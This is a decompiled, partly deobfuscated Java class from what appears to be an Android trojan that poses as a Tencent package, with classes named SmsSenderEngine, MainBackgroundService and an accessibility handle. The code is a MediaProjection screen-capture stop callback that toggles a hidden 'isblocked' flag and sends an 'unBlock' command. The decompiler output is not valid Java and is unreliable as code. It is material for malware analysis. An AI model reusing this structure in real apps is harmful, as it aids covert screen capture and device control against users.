package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: SmsSenderEngine_4
 * Original: Lcom/tencent/skatinghsatinbintegralj9$4;
 */
class SmsSenderEngine_4 extends MediaProjection$Callback {

    // === FIELDS ===
    final SmsSenderEngine this$0;

    // === METHODS ===

     void Constructor(SmsSenderEngine param0) {
        v0.this$0 = v1;
        // new MediaProjection$Callback()
        return;
    }

    public void onStop() {
        v0 = SmsSenderEngine.access$100();
        v0.release();
        v0 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v1 = My_tunesxconcerningn10_Settings.isblocked;
        v2 = 0;
        Boolean.valueOf(0);
        v0 = My_tunesxconcerningn10_Settings.readBool(v0, v1, 0);
        if (v0 == null || v0 == 0) { // goto +16
        v0 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v1 = My_tunesxconcerningn10_Settings.isblocked;
        My_tunesxconcerningn10_Settings.WriteBool(v0, v1, 0);
        v0 = MainBackgroundService.MyAccess;
        v1 = "unBlock";
        v0.Treger("unBlock");
        return;
    }
}
